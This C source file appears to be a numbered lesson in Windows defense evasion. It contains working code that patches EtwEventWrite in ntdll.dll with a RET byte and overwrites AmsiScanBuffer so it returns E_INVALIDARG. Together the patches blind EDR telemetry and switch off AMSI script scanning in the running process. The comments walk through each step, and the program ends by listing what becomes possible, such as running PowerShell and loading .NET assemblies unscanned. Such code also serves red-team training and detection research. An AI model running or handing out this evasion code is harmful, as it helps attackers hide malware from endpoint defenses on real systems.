/*
 * 07_etw_amsi_patch.c
 * ====================
 * ETW Patching + AMSI Bypass
 *
 * ETW (Event Tracing for Windows) is the telemetry system that EDRs
 * use to receive Windows events: process creation, threads,
 * memory allocations, DLL loading, etc.
 *
 * AMSI (Anti-Malware Scan Interface) scans content at runtime:
 * PowerShell scripts, .NET assemblies, VBScript, macros.
 *
 * Both can be disabled with a simple patch:
 * overwrite the beginning of the function with a "ret" (return) instruction,
 * making the function return immediately without doing anything.
 *
 * Compile: cl.exe /O2 07_etw_amsi_patch.c
 */

#include <windows.h>
#include <stdio.h>

/* ---------------------------------------------------------------
 * patchFunction - Overwrites the first bytes of a function
 *
 * functionAddress -> pointer to the beginning of the function in memory
 * patch           -> bytes we'll write (e.g.: ret = 0xC3)
 * patchSize       -> how many bytes to write
 *
 * To write to executable memory, we need to:
 *   1. Change permission to RWX (VirtualProtect)
 *   2. Write the bytes (memcpy)
 *   3. Restore original permission
 *
 * Returns: TRUE if succeeded
 * --------------------------------------------------------------- */
BOOL patchFunction(LPVOID functionAddress, unsigned char* patch, size_t patchSize) {

    DWORD oldPermission = 0;

    /*
     * VirtualProtect changes the permissions of the memory page.
     * PAGE_EXECUTE_READWRITE = we can read, write AND execute.
     * We need this because the .text of the DLL is normally RX only.
     */
    if (!VirtualProtect(functionAddress, patchSize, PAGE_EXECUTE_READWRITE, &oldPermission)) {
        printf("[!] VirtualProtect failed. Error: %lu\n", GetLastError());
        return FALSE;
    }

    /* Overwrite the function bytes with our patch */
    memcpy(functionAddress, patch, patchSize);

    /* Restore original permission */
    VirtualProtect(functionAddress, patchSize, oldPermission, &oldPermission);

    return TRUE;
}


/* ---------------------------------------------------------------
 * disableETW - Patches EtwEventWrite to return immediately
 *
 * EtwEventWrite is the main function that SENDS ETW events.
 * Every time something happens (process created, DLL loaded, etc),
 * Windows calls EtwEventWrite to notify ETW consumers
 * (including the EDR).
 *
 * By patching EtwEventWrite with "ret", NO ETW events are generated
 * in our process. The EDR is blind to everything that happens here.
 *
 * The patch is simple:
 *   0xC3 = RET instruction (returns to caller without doing anything)
 *
 * When someone calls EtwEventWrite, the function simply returns
 * 0 (success) without sending any events.
 * --------------------------------------------------------------- */
BOOL disableETW() {

    printf("[*] Patching ETW...\n");

    /*
     * EtwEventWrite is inside ntdll.dll
     * GetModuleHandleA gets the base address of the DLL
     * GetProcAddress finds the exact address of the function
     */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[!] ntdll.dll not found\n");
        return FALSE;
    }

    LPVOID etwAddress = (LPVOID)GetProcAddress(hNtdll, "EtwEventWrite");
    if (etwAddress == NULL) {
        printf("[!] EtwEventWrite not found\n");
        return FALSE;
    }

    printf("[+] EtwEventWrite at: 0x%p\n", etwAddress);

    /*
     * Patch: just one byte - 0xC3 (RET)
     *
     * Before the patch, EtwEventWrite does:
     *   mov rax, [something]
     *   push rbx
     *   ... (dozens of telemetry instructions)
     *
     * After the patch:
     *   ret    <-- returns immediately, ignores everything
     *   push rbx  <-- never executed
     *   ...
     */
    unsigned char patchRet[] = { 0xC3 }; /* RET */

    if (patchFunction(etwAddress, patchRet, sizeof(patchRet))) {
        printf("[+] ETW disabled! No events will be generated.\n");
        return TRUE;
    }

    return FALSE;
}


/* ---------------------------------------------------------------
 * disableAMSI - Patches AmsiScanBuffer to return "clean"
 *
 * AmsiScanBuffer is called every time PowerShell, .NET or VBScript
 * execute something. It sends the content to the AV/EDR for scanning.
 *
 * The patch makes AmsiScanBuffer return E_INVALIDARG (invalid argument).
 * When the caller receives E_INVALIDARG, it assumes the scan failed
 * and continues execution without blocking - effectively bypassing AMSI.
 *
 * Patch on x64:
 *   xor eax, eax          -> EAX = 0 (clear return)
 *   mov eax, 0x80070057   -> EAX = E_INVALIDARG (HRESULT error)
 *   ret                   -> return
 *
 * The caller sees that AmsiScanBuffer "failed" and doesn't block anything.
 * --------------------------------------------------------------- */
BOOL disableAMSI() {

    printf("[*] Patching AMSI...\n");

    /*
     * AmsiScanBuffer is inside amsi.dll
     * If amsi.dll is not loaded, we need to load it first.
     * LoadLibraryA forces the DLL to load into the process.
     */
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi == NULL) {
        printf("[!] Failed to load amsi.dll. Error: %lu\n", GetLastError());
        return FALSE;
    }

    LPVOID amsiAddress = (LPVOID)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (amsiAddress == NULL) {
        printf("[!] AmsiScanBuffer not found\n");
        return FALSE;
    }

    printf("[+] AmsiScanBuffer at: 0x%p\n", amsiAddress);

    /*
     * Patch in bytes:
     *   B8 57 00 07 80  ->  mov eax, 0x80070057  (E_INVALIDARG)
     *   C3              ->  ret
     *
     * In assembly:
     *   mov eax, 0x80070057
     *   ret
     *
     * 0x80070057 = E_INVALIDARG as HRESULT
     * When AmsiScanBuffer returns this, PowerShell interprets it
     * as "scan failed, but not malware" and continues executing.
     */
    unsigned char patchAmsi[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,  /* mov eax, 0x80070057 */
        0xC3                             /* ret */
    };

    if (patchFunction(amsiAddress, patchAmsi, sizeof(patchAmsi))) {
        printf("[+] AMSI disabled! Scripts will not be scanned.\n");
        return TRUE;
    }

    return FALSE;
}


int main() {

    printf("[*] ETW + AMSI Patch\n");
    printf("[*] ================\n\n");

    /* Disable ETW first (prevents the AMSI patch from generating an alert) */
    disableETW();
    printf("\n");

    /* Then disable AMSI */
    disableAMSI();

    printf("\n[+] Both disabled.\n");
    printf("[*] Now you can:\n");
    printf("    - Load .NET assemblies without scanning\n");
    printf("    - Execute PowerShell without AMSI\n");
    printf("    - Allocate memory without ETW events\n");

    return 0;
}
